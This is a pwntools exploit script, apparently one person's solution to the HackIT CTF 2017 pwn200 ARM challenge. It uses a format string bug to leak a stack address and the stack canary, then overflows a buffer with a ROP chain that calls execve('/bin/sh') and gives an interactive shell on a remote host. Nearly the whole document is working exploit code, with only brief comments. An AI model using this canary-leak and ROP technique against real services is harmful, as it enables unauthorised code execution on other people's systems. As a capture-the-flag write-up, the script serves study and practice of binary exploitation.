# solution for HackIT CTF 2017 pwn200 challenge
# my first ARM exploit :0
# binary is NX + ASLR enabled on the server
# there's a format string vulnerability as well as a buffer overflow
# we can obtain the stack canary through the format string, then perform the overflow.
# since NX is enabled, we have to ROP our way to a shell
# - c3c

from pwn import *
context.arch = 'arm'

#r = process("qemu-arm -g 1235 ./pwn200", shell=True)
r = remote("165.227.98.55", 7777)
print r.recvuntil("CHECK> ")

r.sendline("%3$p-%517$p")
vals = r.recvuntil("I need your clothes").split("I")[0]
print vals
base, canary = map(lambda i: int(i,16), vals.split("-"))
log.info("Canary is 0x%08x" % canary)
fightinput = base+1024
log.info("Our fighting input will be at 0x%08x", fightinput)

r.recvuntil("FIGHT> ")

""" sh shellcode
	r0 <- "/bin/sh"
	r1 <- "sh" # or whatever
	r2 <- 0
	r7 <- 11 # SYS_execve
	svc 0
"""

# 0x00070068 : pop {r0, lr} ; bx lr
pop_r0 = 0x00070068

# 0x0006f9b0: pop {r1, r2, lr}; mul r3, r2, r0; sub r1, r1, r3; bx lr; 
pop_r1_r2 = 0x0006f9b0

# 0x00019d20: pop {r7, lr}; bx lr; 
pop_r7 = 0x00019d20

# 0x000553b8 : svc #0 ;
svc = 0x000553b8

# we're gonna rop around the clock tonight
payload = "/bin/sh\x00".ljust(0x400, "A") + p32(canary) + cyclic(12) 
payload += p32(pop_r0) + p32(fightinput)
payload += p32(pop_r1_r2) + p32(0)*2
payload += p32(pop_r7) + p32(11) 
payload += p32(svc)

r.sendline(payload)

r.interactive()
